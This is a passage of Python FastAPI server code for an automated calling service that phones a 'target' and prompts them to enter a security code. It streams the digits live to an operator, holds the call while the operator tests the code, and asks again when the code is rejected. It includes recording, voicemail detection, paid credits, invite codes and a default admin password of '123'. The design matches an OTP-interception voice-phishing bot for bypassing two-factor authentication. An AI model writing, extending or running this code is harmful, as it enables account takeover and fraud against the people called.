                    {"$set": {"awaiting_verification": False, "current_step": "rejected", "dtmf_code": None}}
                )
                await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
                
                # Continue SignalWire call with rejected message and gather
                try:
                    import base64
                    auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
                    auth_bytes = base64.b64encode(auth_string.encode()).decode()
                    
                    steps = call_log.get("steps", {})
                    config = call_log.get("config", {})
                    voice = config.get("voice_model", "Polly.Joanna-Neural")
                    voice_attr = get_voice_attribute(voice)
                    message = format_tts_message(steps.get("rejected", "Please enter the code again."), config)
                    
                    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="{config.get('otp_digits', 6)}" action="{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice" timeout="10">
        <Say voice="{voice_attr}">{message}</Say>
    </Gather>
</Response>'''
                    
                    async with httpx.AsyncClient() as client:
                        response = await client.post(
                            f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{signalwire_call_sid}.json",
                            data={"Twiml": laml},
                            headers={
                                "Authorization": f"Basic {auth_bytes}",
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            timeout=30.0
                        )
                        logger.info(f"SignalWire reject response: {response.status_code}")
                    
                    await add_call_event(call_id, "REJECTED_PLAYING", "Playing: Please enter the code again...")
                except Exception as e:
                    logger.error(f"Error updating SignalWire call: {e}")
                    
            elif infobip_call_id and INFOBIP_API_KEY:
                background_tasks.add_task(execute_ivr_step, call_id, "rejected")
            else:
                # Simulation - ask for new code
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"awaiting_verification": False, "current_step": "rejected", "dtmf_code": None}}
                )
                await add_call_event(call_id, "VERIFICATION_REJECTED", "Code rejected! Asking for new code...")
                await add_call_event(call_id, "REJECTED_PLAYING", "Playing: Please enter the code again...")
                
                # Simulate new code entry after delay
                await asyncio.sleep(5)
                new_code = "123456"
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_code": new_code, "current_step": "step3", "awaiting_verification": True},
                     "$push": {"dtmf_codes_history": new_code}}
                )
                await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"New security code entered: {new_code}", new_code, show_verify=True)
                await add_call_event(call_id, "AWAITING_VERIFICATION", "Waiting for Accept or Deny...", show_verify=True)
        
        return {"status": "verified", "accepted": is_accepted}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error verifying code: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.post("/calls/{call_id}/hangup")
async def hangup_call_endpoint(call_id: str):
    """Terminate the active call"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        infobip_call_id = call_log.get("infobip_call_id")
        
        if infobip_call_id and INFOBIP_API_KEY:
            await hangup_call(infobip_call_id)
        
        end_time = datetime.now(timezone.utc).isoformat()
        await db.call_logs.update_one(
            {"id": call_id},
            {"$set": {"status": "FINISHED", "ended_at": end_time, "awaiting_verification": False}}
        )
        
        await add_call_event(call_id, "CALL_HANGUP", "Call terminated by user")
        
        # Clean up active calls
        if call_id in active_calls:
            del active_calls[call_id]
        
        return {"status": "hangup", "call_id": call_id}
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Error hanging up: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/calls/{call_id}")
async def get_call(call_id: str):
    call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
    if not call_log:
        raise HTTPException(status_code=404, detail="Call not found")
    return call_log

@api_router.get("/calls")
async def get_all_calls():
    calls = await db.call_logs.find({}, {"_id": 0}).sort("created_at", -1).to_list(100)
    return calls

@api_router.delete("/calls/{call_id}")
async def delete_call(call_id: str):
    result = await db.call_logs.delete_one({"id": call_id})
    if result.deleted_count == 0:
        raise HTTPException(status_code=404, detail="Call not found")
    return {"status": "deleted", "call_id": call_id}

@api_router.get("/calls/{call_id}/events")
async def stream_call_events(call_id: str):
    """SSE endpoint for real-time call events"""
    async def event_generator():
        queue = asyncio.Queue()
        sse_connections[call_id] = queue
        
        try:
            yield f"data: {json.dumps({'type': 'connected', 'message': 'Connected to event stream'})}\n\n"
            
            call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
            if call_log and call_log.get("events"):
                for event in call_log["events"]:
                    yield f"data: {json.dumps(event)}\n\n"
            
            while True:
                try:
                    event = await asyncio.wait_for(queue.get(), timeout=30)
                    yield f"data: {json.dumps(event)}\n\n"
                    
                    if event.get("event_type") in ["CALL_FINISHED", "CALL_FAILED", "CALL_HANGUP"]:
                        break
                except asyncio.TimeoutError:
                    yield f"data: {json.dumps({'type': 'heartbeat'})}\n\n"
                    
        except asyncio.CancelledError:
            logger.info(f"SSE connection closed for call {call_id}")
        finally:
            if call_id in sse_connections:
                del sse_connections[call_id]
    
    return StreamingResponse(
        event_generator(),
        media_type="text/event-stream",
        headers={"Cache-Control": "no-cache", "Connection": "keep-alive", "X-Accel-Buffering": "no"}
    )

# ===================
# Infobip Calls Webhooks
# ===================

@api_router.post("/calls-webhook/events")
async def handle_calls_events(request: Request, background_tasks: BackgroundTasks):
    """Handle Infobip Calls API events (CALL_ESTABLISHED, CALL_FINISHED, etc.)"""
    try:
        payload = await request.json()
        logger.info(f"Calls Event Webhook: {json.dumps(payload)}")
        
        event_type = payload.get("type") or payload.get("event")
        infobip_call_id = payload.get("callId") or payload.get("id")
        
        if not infobip_call_id:
            return {"status": "no call id"}
        
        # Find our call_id by infobip_call_id
        call_log = await db.call_logs.find_one({"infobip_call_id": infobip_call_id}, {"_id": 0})
        if not call_log:
            # Try to find by active_calls mapping
            for cid, icid in active_calls.items():
                if icid == infobip_call_id:
                    call_log = await db.call_logs.find_one({"id": cid}, {"_id": 0})
                    break
        
        if not call_log:
            logger.warning(f"No call found for Infobip call ID: {infobip_call_id}")
            return {"status": "call not found"}
        
        call_id = call_log["id"]
        
        # Handle different event types with detailed logging
        if event_type == "CALL_RINGING":
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "RINGING"}}
            )
            await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
            
        elif event_type == "CALL_PRE_ESTABLISHED":
            await add_call_event(call_id, "CALL_PRE_ESTABLISHED", "Call pre-established, waiting for answer...")
            
        elif event_type == "CALL_EARLY_MEDIA":
            await add_call_event(call_id, "CALL_EARLY_MEDIA", "Early media detected")
            
        elif event_type == "CALL_ESTABLISHED":
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}}
            )
            await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
            
            # Start Step 1
            background_tasks.add_task(execute_ivr_step, call_id, "step1")
            
        elif event_type == "MACHINE_DETECTION_FINISHED":
            # AMD (Answering Machine Detection) result
            detection_result = payload.get("result", {})
            detection_type = detection_result.get("detectionResult", "UNKNOWN")
            
            if detection_type == "HUMAN":
                await add_call_event(call_id, "AMD_DETECTION", "Human voice identified (AMD Success)")
            elif detection_type == "MACHINE":
                await add_call_event(call_id, "AMD_DETECTION", "Voicemail/Machine detected")
            else:
                await add_call_event(call_id, "AMD_DETECTION", f"Detection result: {detection_type}")
            
        elif event_type == "CALL_FINISHED":
            end_time = datetime.now(timezone.utc).isoformat()
            duration = payload.get("duration", 0)
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "FINISHED", "ended_at": end_time, "duration_seconds": duration}}
            )
            await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration}s")
            
            # Clean up
            if call_id in active_calls:
                del active_calls[call_id]
                
        elif event_type == "CALL_FAILED":
            error_code = payload.get("errorCode", {})
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"status": "FAILED", "error_message": str(error_code)}}
            )
            await add_call_event(call_id, "CALL_FAILED", f"Call failed: {error_code}")
            
        elif event_type == "CALL_HANGUP":
            reason = payload.get("hangupReason", "Unknown")
            await add_call_event(call_id, "CALL_HANGUP", f"Call hangup: {reason}")
            
        elif event_type == "SAY_FINISHED":
            # TTS finished - check current step for next action
            current_step = call_log.get("current_step")
            if current_step == "accepted":
                # Hangup after accepted message
                await asyncio.sleep(1)  # Small delay before hangup
                background_tasks.add_task(hangup_call, infobip_call_id)
            elif current_step == "step3":
                # Waiting for verification - do nothing, call stays on hold
                pass
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Calls event webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.post("/calls-webhook/actions")
async def handle_calls_actions(request: Request, background_tasks: BackgroundTasks):
    """Handle Infobip Calls API action responses (DTMF collected, etc.)"""
    try:
        payload = await request.json()
        logger.info(f"Calls Action Webhook: {json.dumps(payload)}")
        
        action_type = payload.get("type") or payload.get("action")
        infobip_call_id = payload.get("callId") or payload.get("id")
        
        if not infobip_call_id:
            return {"status": "no call id"}
        
        call_log = await db.call_logs.find_one({"infobip_call_id": infobip_call_id}, {"_id": 0})
        if not call_log:
            for cid, icid in active_calls.items():
                if icid == infobip_call_id:
                    call_log = await db.call_logs.find_one({"id": cid}, {"_id": 0})
                    break
        
        if not call_log:
            return {"status": "call not found"}
        
        call_id = call_log["id"]
        config = CallConfig(**call_log["config"])
        current_step = call_log.get("current_step", "step1")
        
        if action_type == "COLLECT_FINISHED":
            dtmf = payload.get("result", {}).get("digits") or payload.get("digits")
            
            if dtmf:
                if current_step == "step1":
                    # Step 1 DTMF received
                    await db.call_logs.update_one(
                        {"id": call_id},
                        {"$set": {"dtmf_step1": dtmf}}
                    )
                    await add_call_event(call_id, "DTMF_STEP1_RECEIVED", f"User pressed: {dtmf}", dtmf)
                    
                    # Proceed to Step 2
                    background_tasks.add_task(execute_ivr_step, call_id, "step2")
                    
                elif current_step in ["step2", "rejected"]:
                    # OTP code received
                    if len(dtmf) >= config.otp_digits:
                        otp_code = dtmf[:config.otp_digits]
                        await db.call_logs.update_one(
                            {"id": call_id},
                            {"$set": {"dtmf_code": otp_code, "awaiting_verification": True},
                             "$push": {"dtmf_codes_history": otp_code}}
                        )
                        await add_call_event(call_id, "DTMF_CODE_RECEIVED", f"Security code entered: {otp_code}", otp_code, show_verify=True)
                        
                        # Proceed to Step 3 (verification wait)
                        background_tasks.add_task(execute_ivr_step, call_id, "step3")
                    else:
                        # Incomplete code - retry
                        await add_call_event(call_id, "DTMF_INCOMPLETE", f"Received {len(dtmf)} digits, need {config.otp_digits}")
                        # Retry collection
                        step = "rejected" if current_step == "rejected" else "step2"
                        background_tasks.add_task(execute_ivr_step, call_id, step)
            else:
                # No DTMF received (timeout)
                retry_field = "step1_retry_count" if current_step == "step1" else "step2_retry_count"
                retry_count = call_log.get(retry_field, 0)
                
                if retry_count < 2:
                    await db.call_logs.update_one({"id": call_id}, {"$inc": {retry_field: 1}})
                    await add_call_event(call_id, f"{current_step.upper()}_NO_RESPONSE", f"No input received, retrying... ({retry_count + 1}/3)")
                    
                    # Retry current step
                    background_tasks.add_task(execute_ivr_step, call_id, current_step)
                else:
                    await add_call_event(call_id, "CALL_FAILED", "No response after 3 attempts")
                    await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "FAILED"}})
                    await hangup_call(infobip_call_id)
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"Calls action webhook error: {e}")
        return {"status": "error", "message": str(e)}

@api_router.get("/voice-models")
async def get_voice_models():
    return [
        {"id": "hera", "name": "Hera (Female, Mature)", "gender": "female"},
        {"id": "aria", "name": "Aria (Female, Young)", "gender": "female"},
        {"id": "apollo", "name": "Apollo (Male, Mature)", "gender": "male"},
        {"id": "zeus", "name": "Zeus (Male, Deep)", "gender": "male"},
    ]

@api_router.get("/call-types")
async def get_call_types():
    return [
        {"id": "login_verification", "name": "Login Verification"},
        {"id": "otp_delivery", "name": "OTP Delivery"},
        {"id": "appointment_reminder", "name": "Appointment Reminder"},
        {"id": "custom", "name": "Custom Script"},
    ]

# ===================
# SignalWire Webhooks
# ===================

# Store call state for SignalWire (since webhooks are stateless)
signalwire_call_states: Dict[str, Dict] = {}

@api_router.post("/signalwire-webhook/voice")
async def signalwire_voice_webhook(request: Request):
    """Handle SignalWire voice webhook - returns LaML/XML for IVR"""
    try:
        form_data = await request.form()
        data = dict(form_data)
        logger.info(f"SignalWire Voice Webhook: {json.dumps(data)}")
        
        call_sid = data.get("CallSid", "")
        digits = data.get("Digits", "")
        call_status = data.get("CallStatus", "")
        
        # Find our call by SignalWire call SID
        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
        
        if not call_log:
            # Return basic response if call not found
            return create_laml_response("Sorry, there was an error. Goodbye.", hangup=True)
        
        call_id = call_log["id"]
        current_step = call_log.get("current_step", "step1")
        steps = call_log.get("steps", {})
        config = call_log.get("config", {})
        voice = config.get("voice_model", "Polly.Joanna-Neural")
        
        # Process based on current step
        if not digits:
            # No digits received yet - play the appropriate message
            if current_step == "step1":
                await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
                await add_call_event(call_id, "STEP1_PLAYING", f"Playing greeting - Press 1 or 0 (Voice: {voice})")
                
                message = format_tts_message(steps.get("step1", ""), config)
                return create_laml_gather(message, num_digits=1, action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
            
            elif current_step == "step2":
                await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
                
                message = format_tts_message(steps.get("step2", ""), config)
                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
            
            elif current_step == "step3":
                await add_call_event(call_id, "STEP3_PLAYING", "Playing wait message")
                await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
                
                message = format_tts_message(steps.get("step3", ""), config)
                # Hold the call - wait for verification
                return create_laml_response(message, pause=60, loop=True, voice=voice)
            
            elif current_step == "rejected":
                await add_call_event(call_id, "STEP2_PLAYING", "Asking for code again (retry)")
                
                message = format_tts_message(steps.get("rejected", ""), config)
                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
            
            elif current_step == "accepted":
                await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing accepted message")
                
                message = format_tts_message(steps.get("accepted", ""), config)
                return create_laml_response(message, hangup=True, voice=voice)
        
        else:
            # Digits received
            if current_step == "step1":
                await add_call_event(call_id, "INPUT_STREAM", f"{digits}... (Step 1 Complete)", digits)
                
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_step1": digits, "current_step": "step2"}}
                )
                
                # Move to step 2
                await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
                
                message = format_tts_message(steps.get("step2", ""), config)
                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
            
            elif current_step in ["step2", "rejected"]:
                otp_digits = config.get("otp_digits", 6)
                
                # Stream digits
                for i, digit in enumerate(digits):
                    if i < len(digits) - 1:
                        await add_call_event(call_id, "INPUT_STREAM", f"Receiving: {digits[:i+1]}...")
                
                await add_call_event(call_id, "CAPTURED_CODE", f"Security code: {digits}", digits, show_verify=True)
                
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"dtmf_code": digits, "current_step": "step3", "awaiting_verification": True},
                     "$push": {"dtmf_codes_history": digits}}
                )
                
                # Move to step 3 (waiting)
                await add_call_event(call_id, "STEP3_PLAYING", "Please hold while we verify...")
                await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
                
                message = format_tts_message(steps.get("step3", ""), config)
                return create_laml_response(message, pause=60, loop=True, voice=voice)
        
        return create_laml_response("Thank you. Goodbye.", hangup=True, voice=voice)
        
    except Exception as e:
        logger.error(f"SignalWire voice webhook error: {e}")
        return create_laml_response("Sorry, an error occurred. Goodbye.", hangup=True)

@api_router.post("/signalwire-webhook/status")
async def signalwire_status_webhook(request: Request):
    """Handle SignalWire call status webhook"""
    try:
        form_data = await request.form()
        data = dict(form_data)
        logger.info(f"SignalWire Status Webhook: {json.dumps(data)}")
        
        call_sid = data.get("CallSid", "")
        call_status = data.get("CallStatus", "")
        
        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
        
        if call_log:
            call_id = call_log["id"]
            
            if call_status == "ringing":
                await db.call_logs.update_one({"id": call_id}, {"$set": {"status": "RINGING"}})
                await add_call_event(call_id, "CALL_RINGING", "Target device is ringing...")
            
            elif call_status == "in-progress":
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "ESTABLISHED", "started_at": datetime.now(timezone.utc).isoformat()}}
                )
            
            elif call_status == "completed":
                duration = int(data.get("CallDuration", 0))
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "FINISHED", "ended_at": datetime.now(timezone.utc).isoformat(), "duration_seconds": duration}}
                )
                await add_call_event(call_id, "CALL_FINISHED", f"Call ended. Duration: {duration}s")
                
                # Deduct credits after call ends
                await deduct_user_credits(call_id, duration)
            
            elif call_status == "busy":
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "BUSY", "error_message": "Line busy", "ended_at": datetime.now(timezone.utc).isoformat()}}
                )
                await add_call_event(call_id, "CALL_BUSY", "📵 Line is BUSY - Target is on another call")
            
            elif call_status == "no-answer":
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "NO_ANSWER", "error_message": "No answer", "ended_at": datetime.now(timezone.utc).isoformat()}}
                )
                await add_call_event(call_id, "CALL_NO_ANSWER", "📵 NO ANSWER - Target did not pick up")
            
            elif call_status == "failed":
                sip_code = data.get("SipResponseCode", "")
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "FAILED", "error_message": f"Call failed (SIP: {sip_code})", "ended_at": datetime.now(timezone.utc).isoformat()}}
                )
                await add_call_event(call_id, "CALL_FAILED", f"❌ Call FAILED - SIP Code: {sip_code}")
            
            elif call_status == "canceled":
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "CANCELED", "error_message": "Call canceled", "ended_at": datetime.now(timezone.utc).isoformat()}}
                )
                await add_call_event(call_id, "CALL_CANCELED", "🚫 Call was CANCELED")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"SignalWire status webhook error: {e}")
        return {"status": "error"}

@api_router.post("/signalwire-webhook/amd")
async def signalwire_amd_webhook(request: Request):
    """Handle SignalWire AMD (Answering Machine Detection) webhook"""
    try:
        form_data = await request.form()
        data = dict(form_data)
        logger.info(f"SignalWire AMD Webhook: {json.dumps(data)}")
        
        call_sid = data.get("CallSid", "")
        answered_by = data.get("AnsweredBy", "unknown")
        machine_detection_duration = data.get("MachineDetectionDuration", "")
        
        if not call_sid:
            return {"status": "no call sid"}
        
        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
        
        if call_log:
            call_id = call_log["id"]
            
            # Update call log with AMD result
            await db.call_logs.update_one(
                {"id": call_id},
                {"$set": {"answered_by": answered_by}}
            )
            
            if answered_by == "human":
                await add_call_event(call_id, "AMD_HUMAN", "👤 HUMAN detected - Proceeding with IVR")
            elif answered_by in ["machine_start", "machine_end_beep", "machine_end_silence", "machine_end_other"]:
                await add_call_event(call_id, "AMD_VOICEMAIL", "📧 VOICEMAIL detected - Call will be ended")
                
                # Optionally hang up the call if voicemail detected
                try:
                    import base64
                    auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
                    auth_bytes = base64.b64encode(auth_string.encode()).decode()
                    
                    # Update call to hangup with voicemail message
                    laml = '''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Hangup/>
</Response>'''
                    
                    async with httpx.AsyncClient() as client:
                        response = await client.post(
                            f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{call_sid}.json",
                            data={"Twiml": laml, "Status": "completed"},
                            headers={
                                "Authorization": f"Basic {auth_bytes}",
                                "Content-Type": "application/x-www-form-urlencoded"
                            },
                            timeout=30.0
                        )
                        logger.info(f"AMD hangup response: {response.status_code}")
                    
                    await db.call_logs.update_one(
                        {"id": call_id},
                        {"$set": {"status": "VOICEMAIL", "error_message": "Voicemail detected", "ended_at": datetime.now(timezone.utc).isoformat()}}
                    )
                    await add_call_event(call_id, "CALL_VOICEMAIL", "📧 Call ended - Voicemail box reached")
                except Exception as e:
                    logger.error(f"Error hanging up voicemail call: {e}")
                    
            elif answered_by == "fax":
                await add_call_event(call_id, "AMD_FAX", "📠 FAX machine detected - Ending call")
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {"status": "FAX", "error_message": "Fax detected", "ended_at": datetime.now(timezone.utc).isoformat()}}
                )
            else:
                await add_call_event(call_id, "AMD_UNKNOWN", f"❓ Detection result: {answered_by}")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"SignalWire AMD webhook error: {e}")
        return {"status": "error"}

@api_router.post("/signalwire-webhook/recording")
async def signalwire_recording_webhook(request: Request):
    """Handle SignalWire recording status webhook"""
    try:
        form_data = await request.form()
        data = dict(form_data)
        logger.info(f"SignalWire Recording Webhook: {json.dumps(data)}")
        
        call_sid = data.get("CallSid", "")
        recording_sid = data.get("RecordingSid", "")
        recording_url = data.get("RecordingUrl", "")
        recording_status = data.get("RecordingStatus", "")
        recording_duration = int(data.get("RecordingDuration", 0))
        
        if not call_sid:
            return {"status": "no call sid"}
        
        # Find call by SignalWire call SID
        call_log = await db.call_logs.find_one({"signalwire_call_sid": call_sid}, {"_id": 0})
        
        if call_log:
            call_id = call_log["id"]
            
            if recording_status == "completed" and recording_url:
                # SignalWire recording URLs are publicly accessible
                # Add .mp3 extension for direct playback
                if not recording_url.endswith(".mp3"):
                    recording_url = f"{recording_url}.mp3"
                
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$set": {
                        "recording_url": recording_url,
                        "recording_sid": recording_sid,
                        "recording_duration": recording_duration
                    }}
                )
                
                await add_call_event(
                    call_id, 
                    "RECORDING_AVAILABLE", 
                    f"Call recording available ({recording_duration}s)",
                    show_verify=False
                )
                
                # Also add recording URL to the event for frontend
                await db.call_logs.update_one(
                    {"id": call_id},
                    {"$push": {"events": {
                        "timestamp": datetime.now(timezone.utc).isoformat(),
                        "event_type": "RECORDING_URL",
                        "details": recording_url,
                        "call_id": call_id,
                        "recording_duration": recording_duration
                    }}}
                )
                
                # Broadcast to SSE
                await broadcast_event(call_id, {
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "event_type": "RECORDING_URL",
                    "details": recording_url,
                    "recording_duration": recording_duration,
                    "call_id": call_id
                })
                
                logger.info(f"Recording saved for call {call_id}: {recording_url}")
        
        return {"status": "received"}
        
    except Exception as e:
        logger.error(f"SignalWire recording webhook error: {e}")
        return {"status": "error"}

@api_router.post("/signalwire-webhook/continue/{call_id}")
async def signalwire_continue_call(call_id: str, action: str = "accepted"):
    """Continue SignalWire call after Accept/Deny decision"""
    try:
        call_log = await db.call_logs.find_one({"id": call_id}, {"_id": 0})
        if not call_log:
            raise HTTPException(status_code=404, detail="Call not found")
        
        steps = call_log.get("steps", {})
        config = call_log.get("config", {})
        call_sid = call_log.get("signalwire_call_sid")
        voice = config.get("voice_model", "Polly.Joanna-Neural")
        voice_attr = get_voice_attribute(voice)
        
        if not call_sid:
            return {"status": "error", "message": "No SignalWire call SID"}
        
        import base64
        auth_string = f"{SIGNALWIRE_PROJECT_ID}:{SIGNALWIRE_AUTH_TOKEN}"
        auth_bytes = base64.b64encode(auth_string.encode()).decode()
        
        if action == "accepted":
            message = format_tts_message(steps.get("accepted", "Thank you. Goodbye."), config)
            laml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Say voice="{voice_attr}">{message}</Say>
    <Hangup/>
</Response>"""
        else:
            message = format_tts_message(steps.get("rejected", ""), config)
            laml = f"""<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="{config.get('otp_digits', 6)}" action="{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice">
        <Say voice="{voice_attr}">{message}</Say>
    </Gather>
</Response>"""
        
        # Update call with new TwiML
        async with httpx.AsyncClient() as client:
            response = await client.post(
                f"https://{SIGNALWIRE_SPACE_URL}/api/laml/2010-04-01/Accounts/{SIGNALWIRE_PROJECT_ID}/Calls/{call_sid}.json",
                data={"Twiml": laml},
                headers={
                    "Authorization": f"Basic {auth_bytes}",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                timeout=30.0
            )
            logger.info(f"SignalWire continue call response: {response.status_code}")
        
        return {"status": "ok"}
        
    except Exception as e:
        logger.error(f"SignalWire continue call error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

def format_tts_message(message: str, config: dict) -> str:
    """Format TTS message with variables"""
    return message.replace(
        "{name}", config.get("recipient_name", "")
    ).replace(
        "{service}", config.get("service_name", "")
    ).replace(
        "{digits}", str(config.get("otp_digits", 6))
    )

def get_voice_attribute(voice_model: str) -> str:
    """Get the voice attribute for SignalWire Say verb"""
    # If it's already in correct format (Polly.xxx or Polly.xxx-Neural)
    if voice_model and (voice_model.startswith("Polly.") or voice_model in ["man", "woman"]):
        return voice_model
    # Default to most natural voice
    return "Polly.Joanna-Neural"

def create_laml_response(message: str, hangup: bool = False, pause: int = 0, loop: bool = False, voice: str = "Polly.Joanna-Neural") -> str:
    """Create LaML/XML response for SignalWire"""
    from fastapi.responses import Response
    
    voice_attr = get_voice_attribute(voice)
    
    laml = '<?xml version="1.0" encoding="UTF-8"?>\n<Response>\n'
    laml += f'    <Say voice="{voice_attr}">{message}</Say>\n'
    
    if pause > 0:
        if loop:
            laml += f'    <Pause length="{pause}"/>\n'
            laml += f'    <Redirect>{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice</Redirect>\n'
        else:
            laml += f'    <Pause length="{pause}"/>\n'
    
    if hangup:
        laml += '    <Hangup/>\n'
    
    laml += '</Response>'
    
    return Response(content=laml, media_type="application/xml")

def create_laml_gather(message: str, num_digits: int, action: str, voice: str = "Polly.Joanna-Neural") -> str:
    """Create LaML/XML Gather response for SignalWire"""
    from fastapi.responses import Response
    
    voice_attr = get_voice_attribute(voice)
    
    laml = f'''<?xml version="1.0" encoding="UTF-8"?>
<Response>
    <Gather numDigits="{num_digits}" action="{action}" timeout="10">
        <Say voice="{voice_attr}">{message}</Say>
    </Gather>
    <Say voice="{voice_attr}">We did not receive any input. Goodbye.</Say>
    <Hangup/>
</Response>'''
    
    return Response(content=laml, media_type="application/xml")

# Include routers
from routes_auth import auth_router, admin_router
from routes_providers import provider_router
api_router.include_router(auth_router)
api_router.include_router(admin_router)
api_router.include_router(provider_router)
app.include_router(api_router)

# CORS middleware
app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
    allow_methods=["*"],
    allow_headers=["*"],
)

@app.on_event("startup")
async def startup():
    """Initialize database and create default admin"""
    from auth import get_password_hash
    
    # Create indexes
    await db.users.create_index("email", unique=True)
    await db.users.create_index("id", unique=True)
    await db.invite_codes.create_index("code", unique=True)
    await db.call_logs.create_index("user_id")
    await db.credit_transactions.create_index("user_id")
    
    # Check if admin exists
    admin = await db.users.find_one({"email": "admin@american.club"})
    
    if not admin:
        # Create default admin
        admin_user = {
            "id": str(uuid.uuid4()),
            "email": "admin@american.club",
            "password": get_password_hash("123"),
            "name": "Administrator",
            "role": "admin",
            "credits": 999999,  # Admin has unlimited credits
            "total_credits_used": 0,
            "is_active": True,
            "active_session": {},
            "created_at": datetime.now(timezone.utc).isoformat(),
            "last_login": None
        }
        await db.users.insert_one(admin_user)
        logger.info("Default admin created: admin@american.club")

@app.on_event("shutdown")
async def shutdown():
    global http_client
    if http_client:
        await http_client.aclose()
    client.close()
